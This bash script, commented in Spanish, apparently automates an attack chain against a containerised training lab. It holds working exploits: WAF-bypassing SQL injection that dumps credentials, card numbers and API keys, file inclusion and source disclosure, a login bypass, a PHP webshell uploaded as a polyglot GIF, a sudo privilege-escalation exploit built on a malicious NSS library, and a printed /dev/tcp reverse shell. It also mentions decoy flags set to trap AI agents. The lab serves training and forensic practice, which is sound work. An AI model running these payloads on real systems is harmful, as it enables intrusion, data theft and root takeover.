#!/usr/bin/env bash
# =====================================================================
#  Cadena de ataque automatizada contra el target del laboratorio.
#  Ejecutar DESDE la attacker box:
#     docker compose exec attacker bash /opt/attack.sh
#
#  Historia: primero un atacante SIGILOSO encadena SQLi(bypass WAF) ->
#  LFI(token) -> panel admin -> subida de webshell -> RCE -> FLAG.
#  Despues un atacante RUIDOSO (sqlmap + brute) cruza el umbral de
#  acme-shield (10 ataques) y su IP queda BANEADA 10 minutos.
# =====================================================================
set -u
TARGET="http://web"
PORT="80"
BASE="${TARGET}:${PORT}"
JAR="/tmp/acme.cookies"
UPLOAD_TOKEN=""

line(){ echo; echo "==================== $* ===================="; }

# ------------------- FASE 1: RECONOCIMIENTO -------------------
line "FASE 1 — RECON: descubrimiento de host y servicios (nmap)"
nmap -sV -p1-1000 web

line "FASE 1 — RECON: rutas ocultas en robots.txt (¡y trampa anti-IA!)"
curl -s "$BASE/robots.txt"

line "FASE 1 — RECON: enumeracion de directorios (gobuster)"
# Busca una wordlist existente; si no hay, usa una minima inline.
WL=$(ls /usr/share/wordlists/dirb/common.txt \
        /usr/share/dirb/wordlists/common.txt \
        /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 2>/dev/null | head -n1)
if [ -z "$WL" ]; then
  WL=/tmp/wl.txt
  printf '%s\n' index admin login panel upload config api robots sitemap \
    llms humans backup flag uploads catalog cart checkout view product .well-known > "$WL"
fi
gobuster dir -u "$BASE" -w "$WL" -x php,html,txt -q -t 20 || true

# ------------------- FASE 2: SQLi CON BYPASS DE WAF -------------------
# Los payloads de manual (UNION SELECT, ORDER BY, -- ) dan 403.
# Bypass: comentario inline /**/ como separador y '#' como comentario.
line "FASE 2 — WAF: el payload de manual se BLOQUEA (403)"
curl -s -o /dev/null -w "  UNION SELECT clasico -> HTTP %{http_code} (bloqueado)\n" \
  "$BASE/product.php?id=-1%20UNION%20SELECT%201,2,3,4"

line "FASE 2 — BYPASS: /**/ evade el WAF y confirma columnas"
curl -s -o /dev/null -w "  order/**/by/**/4 -> HTTP %{http_code}\n" \
  "$BASE/product.php?id=1/**/order/**/by/**/4"

strip(){ sed 's/<[^>]*>/ /g' | tr -s ' ' | grep -Ei "$1" | head -n 20; }

line "FASE 2 — EXPLOIT: volcar credenciales de admin (bypass /**/ + #)"
curl -s "$BASE/product.php?id=-1/**/union/**/select/**/id,username,password,role/**/from/**/users%23" \
  | strip 'admin|superadmin|editor|support|S3cr3t|Summer|helpdesk'

line "FASE 2 — EXPLOIT: exfiltrar PII de clientes"
curl -s "$BASE/product.php?id=-1/**/union/**/select/**/full_name,email,credit_card,national_id/**/from/**/customers%23" \
  | strip '@example|[0-9]{4} [0-9]{4}|national|X[0-9]{7}'

line "FASE 2 — EXPLOIT: robar API keys"
curl -s "$BASE/product.php?id=-1/**/union/**/select/**/service,api_key,3,4/**/from/**/api_keys%23" \
  | strip 'sk_live|AKIA|SG\.|stripe|aws|sendgrid'

# ------------------- FASE 3: LFI -> FUGA DEL TOKEN DEL IMPORTADOR ------
line "FASE 3 — LFI: /etc/passwd (path traversal)"
curl -s "$BASE/view.php?page=../../../../etc/passwd" | head -n 3

line "FASE 3 — LFI: source disclosure de config.php (php://filter)"
# La pagina lleva varios blobs base64 (favicon, politica...): decodifica
# todos y quedate con el que contiene el token del importador.
UPLOAD_TOKEN=$(curl -s "$BASE/view.php?page=php://filter/convert.base64-encode/resource=config.php" \
  | grep -Eo '[A-Za-z0-9+/=]{40,}' \
  | while read -r b; do echo "$b" | base64 -d 2>/dev/null | grep -Eo 'acme_upl_[a-f0-9]+'; done \
  | head -n1)
echo "[+] UPLOAD_TOKEN filtrado via LFI: ${UPLOAD_TOKEN:-<no encontrado>}"

# ------------------- FASE 4: BYPASS DE AUTH -> SESION ADMIN -----------
line "FASE 4 — AUTH BYPASS: login con  admin'#  (el WAF bloquea el -- )"
curl -s -c "$JAR" -o /dev/null \
  --data-urlencode "username=admin'#" --data-urlencode "password=x" \
  "$BASE/login.php"
echo "[+] Sesion guardada; comprobando acceso al panel ..."
PANEL=$(curl -s -b "$JAR" "$BASE/panel.php")
echo "$PANEL" | grep -qi "Importador de imagenes" \
  && echo "[+] Panel de admin accesible (sesion valida)" \
  || echo "[-] No se pudo entrar al panel"
# FLAG 1 (USER): se muestra al entrar al panel (junto a señuelos anti-IA ocultos;
# la real es la 'us3r_...', el resto son cebos para agentes).
echo "[*] FLAG USER -> $(echo "$PANEL" | grep -Eo 'FLAG\{us3r[^}]*\}' | head -n1)"

# Plan B por si el LFI no filtro el token: scrapearlo del panel (campo oculto).
if [ -z "$UPLOAD_TOKEN" ]; then
  UPLOAD_TOKEN=$(curl -s -b "$JAR" "$BASE/panel.php" | grep -Eo 'acme_upl_[a-f0-9]+' | head -n1)
  echo "[+] Token via panel: ${UPLOAD_TOKEN:-<no encontrado>}"
fi

# ------------------- FASE 5: SUBIDA DE WEBSHELL (POLYGLOT) -> RCE -----
line "FASE 5 — UPLOAD: polyglot GIF89a + PHP como shell.phtml"
SHELL_FILE="/tmp/shell.phtml"
printf 'GIF89a;\n<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>\n' > "$SHELL_FILE"
curl -s -b "$JAR" \
  -F "token=${UPLOAD_TOKEN}" \
  -F "productImage=@${SHELL_FILE};type=image/gif;filename=shell.phtml" \
  "$BASE/upload.php"

line "FASE 5 — RCE: comandos via el webshell (usuario del servicio -> www-data)"
echo "[*] id       -> $(curl -s "$BASE/uploads/shell.phtml?c=id")"
echo "[*] /root/root.txt como www-data -> $(curl -s -G "$BASE/uploads/shell.phtml" --data-urlencode 'c=cat /root/root.txt 2>&1' | tail -1)"

# --------- FASE 5b: PRIVESC  www-data -> root  (CVE-2025-32463) ----------
line "FASE 5b — PRIVESC: CVE-2025-32463 (sudo chroot LPE) -> ROOT REAL"
PE=$(mktemp)
cat > "$PE" <<'EOF'
S=$(mktemp -d /tmp/w.XXXXXX); cd "$S"
cat > w.c <<'C'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void w(void){ setreuid(0,0); setregid(0,0);
  system("cat /root/root.txt > /tmp/root_out 2>/dev/null; chmod 644 /tmp/root_out"); _exit(0); }
C
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,w -o libnss_/woot1337.so.2 w.c
/usr/local/bin/sudo -R woot woot 2>/dev/null || true
EOF
B64=$(base64 -w0 "$PE")
curl -s -G "$BASE/uploads/shell.phtml" --data-urlencode "c=echo $B64|base64 -d>/tmp/pe.sh" >/dev/null
curl -s -G "$BASE/uploads/shell.phtml" --data-urlencode "c=bash /tmp/pe.sh" >/dev/null
echo "[*] sudo del target -> $(curl -s "$BASE/uploads/shell.phtml?c=/usr/local/bin/sudo%20--version" | grep -i 'Sudo version' | head -1)"
echo "[*] FLAG ROOT (leida como root real) -> $(curl -s -G "$BASE/uploads/shell.phtml" --data-urlencode 'c=cat /tmp/root_out' | grep -Eo 'FLAG\{[^}]*\}')"
rm -f "$PE"

cat <<'EOF'

  [i] Manual: reverse shell www-data + privesc con CVE-2025-32463:
      # attacker box:   nc -lvnp 4444
      curl "http://web/uploads/shell.phtml?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/attacker/4444%200>%261'"
      # ya con shell www-data, compilar libnss malicioso + sudo -R woot woot
      #   (detalle paso a paso en docs/07-ctf-rce-chain.md)

EOF

# ------------------- FASE 6: RUIDO -> AUTO-BAN DE acme-shield ---------
line "FASE 6 — RUIDO: sqlmap dispara >10 ataques -> acme-shield BANEA la IP"
sqlmap -u "$BASE/product.php?id=1" --batch --dbms=mysql --level=2 \
  -D appdb --tables --threads=4 || true

line "FASE 6 — Comprobando el veto (deberia responder 403 durante 10 min)"
curl -s -o /dev/null -w "  product.php UNION -> HTTP %{http_code} (403 = IP baneada)\n" \
  "$BASE/product.php?id=-1/**/union/**/select/**/1,2,3,4%23"

line "FASE 6 — Ruido extra: brute force de login (mas 401 para el SIEM)"
for pw in 123456 password admin letmein toor; do
  curl -s -o /dev/null -X POST -d "username=admin&password=$pw" "$BASE/login.php"
done

line "Ataque completado — revisa Kibana (index weblogs-*) para el analisis forense"
echo "Tags a buscar: sqli_pattern, lfi_pattern, admin_area, webshell, rce, waf_block, ip_banned"
